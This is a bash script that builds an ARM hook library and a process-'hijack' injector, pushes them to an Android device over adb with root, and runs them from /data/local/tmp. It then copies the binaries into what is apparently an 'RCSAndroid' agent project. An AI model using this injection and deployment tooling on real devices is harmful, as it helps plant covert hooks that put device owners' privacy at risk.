#!/bin/bash -
#===============================================================================
#
#          FILE: makeAndDeploy.sh
#
#         USAGE: ./makeAndDeploy.sh
#
#   DESCRIPTION:
#
#       OPTIONS: ---
#  REQUIREMENTS: ---
#          BUGS: ---
#         NOTES: ---
#        AUTHOR: zad (),
#  ORGANIZATION:
#       CREATED: 21/07/2014 08:55:18 CEST
#      REVISION:  ---
#===============================================================================

set -o nounset                              # Treat unset variables as an error

export CC=/home/zad/bin/arm-2008q3/bin/arm-none-linux-gnueabi-gcc
export LD=/home/zad/bin/arm-2008q3/bin/arm-none-linux-gnueabi-ld
export PLATFORM_NDK="`pwd`/../../../androidSources/development/ndk/platforms/android-9/arch-mips/"
echo -n "make Debugging,Logging,Normal build? [d/l/N] press [ENTER]: "
read debug
debug=`echo $debug | tr '[:upper:]' '[:lower:]'`
echo -n "make also hijack? [y/N] press [ENTER]: "
read injector
injector=`echo $injector | tr '[:upper:]' '[:lower:]'`
echo -n "run on target? [y/N] press [ENTER]: "
read run
run=`echo $run | tr '[:upper:]' '[:lower:]'`
if [[ "$run" == "y" ]]; then
  echo -n "target has su [y/N] press [ENTER]: "
  read supresent
  supresent=`echo $supresent | tr '[:upper:]' '[:lower:]'`
fi



echo -n "copy in agent? [y/N] press [ENTER]: "
read copy
copy=`echo $copy | tr '[:upper:]' '[:lower:]'`

if [[ "$debug" == "d" ||  "$debug" == "l" ]]; then
  echo "DEBUG MODE ON!"
  export CFLAGS="-g -DDEBUG -DDEBUG_UTIL -DDEBUG_HOOKFNC -DDEBUG_LIBT"
  if [[ "$debug" == "l" ]]; then
    export CFLAGS="-DLOGONLY $CFLAGS"
  fi
  export CFLAGS="$CFLAGS -I$PLATFORM_NDK"
else
  debug="n"
  export CFLAGS="-I$PLATFORM_NDK"
fi

if [[ "$injector" == "y" ]]; then
  echo "INJECTOR ENABLED!"
  export BUILD_HIJACK="YES"
  injector="y"
else
  injector="n"
  export BUILD_HIJACK=""
fi
echo "cleaning previous build.."
make clean
echo "building ..."
make
if [[ $? -gt 0 ]]; then
  echo "ERROR! make"
  exit 1
fi
if [[ "$run" == "y" && "$supresent" == "y" ]]; then
  export SUCMD="su -c"
  #export SUCMD="rilcap2 qzx"
else
  export SUCMD=""
fi

function exec_adb(){
  echo adb shell $SUCMD $@
  adb shell $SUCMD $@
}


if [[ "$run" == "y" ]]; then
  echo "pushing make output ..."
  exec_adb 'mkdir /data/local/tmp/dump'
  exec_adb 'chmod 777 /data/local/tmp'
  exec_adb 'chmod 777 /data/local/tmp/dump'
  exec_adb 'chown media /data/local/tmp/dump'
  exec_adb 'rm /data/local/tmp/libt.so '
  SDCARD=/storage/sdcard
  if `adb shell ls $SDCARD | grep -q "No such file or directory"`;
  then
    SDCARD=/sdcard
    if `adb shell ls  $SDCARD | grep -q "No such file or directory"`;
    then
      SDCARD=/storage/sdcard0
      echo "use $SDCARD";
    else
      echo "use $SDCARD";
    fi
  fi

  if [[ "$injector" == "y" ]]; then
    echo adb push hijack/libs/armeabi/hijack $SDCARD/
    adb push hijack/libs/armeabi/hijack $SDCARD/
    if [[ $? -gt 0 ]]; then
      echo "ERROR! failed to push hijack on target"
      exit 1
    fi
    cmd="cat $SDCARD/hijack > /data/local/tmp/hijack"
    #echo $cmd
    exec_adb $cmd
    cmd="rm $SDCARD/hijack"
    #echo $cmd
    exec_adb $cmd
    exec_adb 'chmod 777 /data/local/tmp/hijack'

  fi

  if [[ "$debug" == "d" ||  "$debug" == "l" ]]; then

    adb push libt_debug.so $SDCARD/libt.so
    cp libt_debug.so libt.so
  else
    adb push libt.so $SDCARD/libt.so
  fi
  if [[ $? -gt 0 ]]; then
    echo "ERROR! failed to push libt.so/libt_debug.so on target"
    exit 1
  fi
  cmd="cat $SDCARD/libt.so > /data/local/tmp/libt.so"
  #echo $cmd
  exec_adb $cmd
  cmd="rm $SDCARD/libt.so"
  #echo $cmd
  exec_adb $cmd
  adb push hijjj.sh $SDCARD/
  cmd="cat $SDCARD/hijjj.sh > /data/local/tmp/hijjj.sh"
  #echo $cmd
  exec_adb $cmd
  cmd="rm $SDCARD/hijjj.sh"
  #echo $cmd
  exec_adb $cmd
  #echo adb shell $SUCMD 'chmod 777 /data/local/tmp/hijjj.sh'
  exec_adb 'chmod 777 /data/local/tmp/hijjj.sh'
  #echo adb shell $SUCMD 'rm /data/local/tmp/log'
  exec_adb 'rm /data/local/tmp/log'
  #echo adb shell $SUCMD 'touch /data/local/tmp/log'
  exec_adb 'touch /data/local/tmp/log'
  #echo adb shell $SUCMD 'chmod 666 /data/local/tmp/log'
  exec_adb 'chmod 666 /data/local/tmp/log'
  #echo adb shell $SUCMD 'chown media /data/local/tmp/log'
  exec_adb 'chown media /data/local/tmp/log'
  #echo adb shell $SUCMD '/data/local/tmp/hijjj.sh'
  exec_adb '/data/local/tmp/hijjj.sh'
  fuser ./runoutput.log -s -k -9
  if [ -z "$SUCMD" ]; then
    killall -9 chekOutput.sh
    ./chekOutput.sh&
  else
    exec_adb 'fuser -k -s -9  /data/local/tmp/log'
    exec_adb "tail -f  /data/local/tmp/log" > ./runoutput.log &
  fi
fi

if [[ "$copy" == "y" ]]; then
  if [[ "$debug" == "d" ]]; then
    cp libt_debug.so  /home/zad/work/devel/core-android/RCSAndroid/preprocess/libt.so
  else
    cp libt.so  /home/zad/work/devel/core-android/RCSAndroid/preprocess/libt.so
  fi
    cp hijack/obj/local/armeabi/hijack   /home/zad/work/devel/core-android/RCSAndroid/preprocess/ && cd /home/zad/work/devel/core-android/RCSAndroid && ant set-debug && cd -
fi
